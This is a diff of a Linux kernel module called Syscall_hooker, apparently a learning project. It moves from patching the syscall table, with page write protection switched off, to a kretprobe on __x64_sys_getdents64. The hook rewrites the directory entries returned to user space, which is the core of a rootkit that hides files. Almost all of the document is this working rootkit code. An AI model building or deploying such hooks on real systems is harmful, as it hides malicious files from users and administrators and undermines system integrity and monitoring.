@@ -1,7 +1,9 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/moduleparam.h>
+#include <linux/kprobes.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("LavaTime");
@@ -17,39 +19,35 @@ struct linux_dirent64 {
 	char d_name[];
 };
 
-static unsigned long sym_addr = 0;
-static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
-static void**sys_call_table;
-
-module_param(sym_addr, ulong, 0644);
-
-
-static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
+static int kprobe_entry_handler_hacked_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	int fd __attribute__((unused))= (int)regs->di; // Marked as unused, only for learning
-	struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
-	int count __attribute__((unused)) = regs->dx; // Marked as unused, only for learning
+	*((unsigned long *)ri->data) = ((struct pt_regs *)(regs->di))->si; // the entry_handler pt_regs are the kernel registers, so we must take regs->di since it's the pointer to the pt_regs of user mode :)
+	return 0;
+}
 
-	long ret = orig_getdents64(regs);
+static int hack_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	unsigned long ret = regs->ax;
+	struct linux_dirent64* dirp = (struct linux_dirent64*)*(unsigned long*)ri->data;
 	if (ret <= 0)
 	{
-		return ret;
+		return 0;
 	}
 	else
 	{
 		struct linux_dirent64* kdirent;
 		struct linux_dirent64* current_dir;
 		unsigned long offset = 0;
-
-		kdirent = kmalloc(ret, GFP_KERNEL);
+		kdirent = kmalloc(ret, GFP_ATOMIC);
 		if (kdirent == NULL)
 		{
-			return ret;
+			return 0;
 		}
-		if (copy_from_user(kdirent, dirp, ret) != 0)
+		int copy_ret = copy_from_user_nofault(kdirent, dirp, ret);
+		if (copy_ret != 0)
 		{
 			kfree(kdirent);
-			return ret;
+			return 0;
 		}
 
 		while (offset < ret)
@@ -66,55 +64,45 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
 				offset += current_dir->d_reclen;
 			}
 		}
-		if (copy_to_user(dirp, kdirent, ret) != 0)
+		if (copy_to_user_nofault(dirp, kdirent, ret) != 0)
 		{
 			kfree(kdirent);
-			return -EFAULT;
+			return 0;
 		}
 		kfree(kdirent);
-		return ret;
+		regs->ax = ret;
+		return 0;
 	}
 }
 
+static struct kretprobe getdents64_kretprobe = {
+	.handler = hack_getdents64,
+	.entry_handler = kprobe_entry_handler_hacked_getdents64,
+	.data_size = 8,
+	.maxactive = 0,
+	.kp = {
+		.symbol_name = "__x64_sys_getdents64",
+	},
+};
+
 static int __init syscall_hooking_init(void)
 {
-	if (sym_addr == 0)
+	int ret;
+	ret = register_kretprobe(&getdents64_kretprobe);
+	if (!ret)
 	{
-		printk(KERN_WARNING "Syscall_hooker: Didn't receive a sys_call_table location!\n");
-		return -1;
+		printk(KERN_INFO "Syscall_hooker: Target acquired.\n");
 	}
-	sys_call_table = (void **)sym_addr;
-	orig_getdents64 = (asmlinkage long (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
-	unsigned int __attribute__((unused)) level;
-	pte_t *getdents64_pointer_pte;
-	getdents64_pointer_pte = lookup_address((unsigned long)(&(sys_call_table[__NR_getdents64])), &level);
-	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte | _PAGE_RW;
-	// Deprecated: unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
-	// Depreacated: asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
-	sys_call_table[__NR_getdents64] = hacked_getdents64;
-	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte & ~(_PAGE_RW);
-	// Deprecated: unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
-	// Deprecated: asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
-	
-	
-	
-	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
-	
-	return 0;
+	else
+	{
+		printk(KERN_WARNING "Syscall_hooker: Target escaped! We'll get them next time.\n");
+	}
+	return ret;
 }
 
 static void __exit syscall_hooking_exit(void)
 {
-	unsigned int __attribute__((unused)) level;
-	pte_t *getdents64_pointer_pte;
-	getdents64_pointer_pte = lookup_address((unsigned long)(&(sys_call_table[__NR_getdents64])), &level);
-	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte | _PAGE_RW;
-	// Deprecated: unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
-	// Depreacated: asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
-	sys_call_table[__NR_getdents64] = orig_getdents64;
-	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte & ~(_PAGE_RW);
-	// Deprecated: unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
-	// Deprecated: asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
+	unregister_kretprobe(&getdents64_kretprobe);
 	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
 }
 
